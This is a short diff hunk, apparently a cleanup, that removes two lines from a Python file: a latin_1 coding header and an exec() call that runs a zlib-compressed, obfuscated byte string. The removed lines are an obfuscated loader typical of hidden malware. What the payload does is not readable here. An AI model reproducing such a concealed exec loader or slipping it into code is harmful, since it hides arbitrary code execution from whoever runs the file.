@@ -1,2 +1,0 @@
-#coding:latin_1
-import zlib;exec(zlib.decompress(bytes(map(ord,'xÚUÁ\nÃ †ï}Š•ö²±Ã(ø$âÁ²(âæFhAß¾m,u=„¾ÿKòB?áåØû„a«˜–’±Fyd“GñÆ$H2à€t6J=xähiÑÜß†ÿø!”&T%6%Š?–¼f;ÔsßıçIyƒ½nˆM®|º>Uäèµ5z2êŞá¼P¿ÍoKÿ'))))
